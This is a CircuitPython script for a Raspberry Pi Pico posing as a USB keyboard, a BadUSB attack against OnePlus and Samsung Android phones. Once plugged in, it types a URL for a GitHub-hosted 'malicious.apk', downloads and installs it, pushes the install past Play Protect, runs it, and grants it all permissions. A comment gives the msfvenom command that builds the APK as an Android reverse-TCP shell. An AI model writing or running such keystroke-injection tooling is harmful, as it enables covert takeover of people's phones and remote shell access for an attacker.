import time
import digitalio
import usb_hid
import board

from adafruit_hid.keyboard import Keyboard
from keyboard_layout_win_sf import KeyboardLayout
from keycode_win_sf import Keycode

# Load Raspberry Pi Pico as HID Keyboard device
keyboard = Keyboard(usb_hid.devices)
layout = KeyboardLayout(keyboard)

# Load the default LED of the Raspberry Pi Pico
led = digitalio.DigitalInOut(board.LED)
led.direction = digitalio.Direction.OUTPUT

# While wait if no pin connected
progStatus = False
progStatusPin = digitalio.DigitalInOut(board.GP0)
progStatusPin.switch_to_input(pull=digitalio.Pull.UP)
progStatus = not progStatusPin.value

OnePlusStatus = False
OnePlusStatusPin = digitalio.DigitalInOut(board.GP4)
OnePlusStatusPin.switch_to_input(pull=digitalio.Pull.UP)
OnePlusStatus = not OnePlusStatusPin.value

SamsungStatus = False
SamsungStatusPin = digitalio.DigitalInOut(board.GP5)
SamsungStatusPin.switch_to_input(pull=digitalio.Pull.UP)
SamsungStatus = not SamsungStatusPin.value

while True:
    OnePlusStatusPin.switch_to_input(pull=digitalio.Pull.UP)
    OnePlusStatus = not OnePlusStatusPin.value
    progStatusPin.switch_to_input(pull=digitalio.Pull.UP)
    progStatus = not progStatusPin.value
    SamsungStatusPin.switch_to_input(pull=digitalio.Pull.UP)
    SamsungStatus = not SamsungStatusPin.value
    led.value = True
    time.sleep(0.5)
    led.value = False
    time.sleep(0.5)
    if SamsungStatus or OnePlusStatus or progStatus is True:
        break

# Start the LED to show that the script is running.
led.value = True
time.sleep(3.0)

# Check GP0 for debug
if progStatus is False:
    # Check GP4 to select OnePlus7Pro Device
    if OnePlusStatus is True:
        device = "OP7P"
        OnePlus = ["OP7P", "OP8P"]
        OnePlusDevice = True
    else:
        OnePlusDevice = False

    # Check GP6 to Select Samsung Galaxy S9 Device
    if SamsungStatus is True:
        device = "SGS9E"
        Samsung = ["SGS9E"]
        SamsungDevice = True
    else:
        SamsungDevice = False

    # Open browser with default shortcut
    keyboard.press(Keycode.GUI, Keycode.B)
    keyboard.release_all()
    time.sleep(0.5)

    # Open a new tab to reach the google search home page
    keyboard.press(Keycode.CONTROL, Keycode.T)
    keyboard.release_all()
    time.sleep(1.5)

    # Reach the search bar
    keyboard.press(Keycode.CONTROL, Keycode.L)
    keyboard.release_all()
    time.sleep(0.5)

    # Do you'r research
    # msfvenom -p android/shell/reverse_tcp LHOST=ip LPORT=port -f raw -o malicious.apk
    # TODO : Fix keyboard layout
    layout.write("httpsö--github.com-V0lk3n-HIDScripts-raw-main-Backdoor-malicious.apk")
    time.sleep(0.5)
    keyboard.press(Keycode.ENTER)
    keyboard.release_all()
    time.sleep(0.5)

    # Open Chrome Menu
    keyboard.press(Keycode.ALT, Keycode.F)
    keyboard.release_all()
    time.sleep(0.5)

    # Select Download Menu
    keyboard.press(Keycode.TAB)
    keyboard.release_all()
    time.sleep(0.5)
    keyboard.press(Keycode.TAB)
    keyboard.release_all()
    time.sleep(0.5)
    keyboard.press(Keycode.TAB)
    keyboard.release_all()
    time.sleep(0.5)
    keyboard.press(Keycode.TAB)
    keyboard.release_all()
    time.sleep(0.5)
    keyboard.press(Keycode.TAB)
    keyboard.release_all()
    time.sleep(0.5)
    keyboard.press(Keycode.ENTER)
    keyboard.release_all()
    time.sleep(0.5)

    # Locate the downloaded malware on download page
    keyboard.press(Keycode.DOWN_ARROW)
    keyboard.release_all()
    time.sleep(0.5)
    keyboard.press(Keycode.DOWN_ARROW)
    keyboard.release_all()
    time.sleep(0.5)
    keyboard.press(Keycode.ENTER)
    keyboard.release_all()
    time.sleep(0.5)

    # Open the malware to install it
    if OnePlusDevice == True:
        keyboard.press(Keycode.TAB)
        keyboard.release_all()
        time.sleep(0.5)
        keyboard.press(Keycode.ENTER)
        keyboard.release_all()
        time.sleep(1.0)
        keyboard.press(Keycode.TAB)
        keyboard.release_all()
        time.sleep(0.5)
        if device == "OP8P":
            keyboard.press(Keycode.TAB)
            keyboard.release_all()
            time.sleep(0.5)
        keyboard.press(Keycode.ENTER)
        keyboard.release_all()
        time.sleep(1.5)
    elif SamsungDevice == True:
        keyboard.press(Keycode.TAB)
        keyboard.release_all()
        time.sleep(0.5)
        keyboard.press(Keycode.ENTER)
        keyboard.release_all()
        time.sleep(1.5)
    else:
        led.value = False
        time.sleep(1.0)
        led.value = True
        time.sleep(1.0)
        led.value = False
        time.sleep(1.0)
        led.value = True
        time.sleep(1.0)
        led.value = False
        time.sleep(1.0)
        led.value = True
        time.sleep(1.0)

    # Force install once blocked by play protect
    if SamsungDevice == True:
        keyboard.press(Keycode.TAB)
        keyboard.release_all()
        time.sleep(0.5)
        keyboard.press(Keycode.TAB)
        keyboard.release_all()
        time.sleep(0.5)
        keyboard.press(Keycode.ENTER)
        keyboard.release_all()
        time.sleep(2.5)

    # Run the malware
    if OnePlusDevice == True:
        keyboard.press(Keycode.ENTER)
        keyboard.release_all()
        time.sleep(0.5)
    elif SamsungDevice == True:
        keyboard.press(Keycode.TAB)
        keyboard.release_all()
        time.sleep(0.5)
        keyboard.press(Keycode.ENTER)
        keyboard.release_all()
        time.sleep(0.5)
    else:
        led.value = False
        time.sleep(1.0)
        led.value = True
        time.sleep(1.0)
        led.value = False
        time.sleep(1.0)
        led.value = True
        time.sleep(1.0)
        led.value = False
        time.sleep(1.0)
        led.value = True
        time.sleep(1.0)

    # Give all the permission to the malware
    keyboard.press(Keycode.TAB)
    keyboard.release_all()
    time.sleep(0.5)
    keyboard.press(Keycode.TAB)
    keyboard.release_all()
    time.sleep(0.5)
    keyboard.press(Keycode.TAB)
    keyboard.release_all()
    time.sleep(0.5)
    keyboard.press(Keycode.TAB)
    keyboard.release_all()
    time.sleep(0.5)
    keyboard.press(Keycode.TAB)
    keyboard.release_all()
    time.sleep(0.5)
    keyboard.press(Keycode.TAB)
    keyboard.release_all()
    time.sleep(0.5)
    keyboard.press(Keycode.TAB)
    keyboard.release_all()
    time.sleep(0.5)
    keyboard.press(Keycode.TAB)
    keyboard.release_all()
    time.sleep(0.5)
    keyboard.press(Keycode.TAB)
    keyboard.release_all()
    time.sleep(0.5)
    keyboard.press(Keycode.ENTER)
    keyboard.release_all()
    time.sleep(0.5)

    # Close Old App warning
    # TODO : Check how to avoid this
    keyboard.press(Keycode.ENTER)
    keyboard.release_all()
    time.sleep(0.5)

    # Go to Home Screen with default keyboard shortcut
    keyboard.press(Keycode.GUI, Keycode.ENTER)
    keyboard.release_all()
    time.sleep(0.5)

    # Stop the LED to show that the script has ended.
    led.value = False
    time.sleep(0.5)
